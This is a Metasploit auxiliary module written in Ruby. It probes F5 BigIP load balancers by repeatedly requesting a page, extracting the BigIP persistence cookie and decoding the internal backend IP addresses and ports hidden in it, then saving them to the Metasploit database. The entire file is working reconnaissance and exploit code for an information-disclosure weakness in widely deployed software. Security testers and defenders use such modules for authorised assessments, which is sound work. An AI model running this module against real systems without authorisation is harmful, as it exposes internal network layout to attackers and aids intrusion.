##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP Backend Cookie Disclosure',
      'Description'    => %q{
        This module identifies F5 BigIP load balancers and leaks backend
        information through cookies inserted by the BigIP devices.
      },
      'Author'         => [ 'Thanat0s <thanspam[at]trollprod.org>' ],
      'References'     =>
        [
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html'],
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/7000/700/sol7784.html?sr=14607726']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to test', '/']),
        OptInt.new('REQUESTS', [true, 'Number of requests to send to disclose back', 10])
      ], self.class)
  end

  def change_endianness(value, size=4)
    conversion = value

    if size == 4
      conversion = [value].pack("V").unpack("N").first
    elsif size == 2
      conversion = [value].pack("v").unpack("n").first
    end

    conversion
  end

  def cookie_decode(cookie_value)
    back_end = ""

    if cookie_value =~ /(\d{8})\.(\d{5})\./
      host = $1.to_i
      port = $2.to_i

      host = change_endianness(host)
      host = Rex::Socket.addr_itoa(host)

      port = change_endianness(port, 2)

      back_end = "#{host}:#{port}"
    end

    back_end
  end

  def get_cookie # request a page and extract a F5 looking cookie.
    cookie = {}
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => @uri
    })

    unless res.nil?
      # Get the SLB session ID, like "TestCookie=2263487148.3013.0000"
      m = res.get_cookies.match(/([\-\w\d]+)=((?:\d+\.){2}\d+)(?:$|,|;|\s)/)
      unless m.nil?
        cookie[:id] = (m.nil?) ? nil : m[1]
        cookie[:value] = (m.nil?) ? nil : m[2]
      end
    end

    cookie
  end

  def run
    unless datastore['REQUESTS'] > 0
      print_error("Please, configure more than 0 REQUESTS")
      return
    end

    back_ends = []
    @uri = normalize_uri(target_uri.path.to_s)
    print_status("#{peer} - Starting request #{@uri}")

    for i in 0...datastore['REQUESTS']
      cookie = get_cookie() # Get the cookie
      # If the cookie is not found, stop process
      if cookie.empty? || cookie[:id].nil?
        print_error("#{peer} - F5 Server load balancing cookie not found")
        break
      end

      # Print the cookie name on the first request
      if i == 0
        print_status("#{peer} - F5 Server load balancing cookie \"#{cookie[:id]}\" found")
      end

      back_end = cookie_decode(cookie[:value])
      unless back_ends.include?(back_end)
        print_status("#{peer} - Backend #{back_end} found")
        back_ends.push(back_end)
      end
    end

    # Reporting found backends in database
    unless back_ends.empty?
      report_note(
       :host => rhost,
       :type => "f5_load_balancer_backends",
       :data => back_ends
      )
    end

  end
end
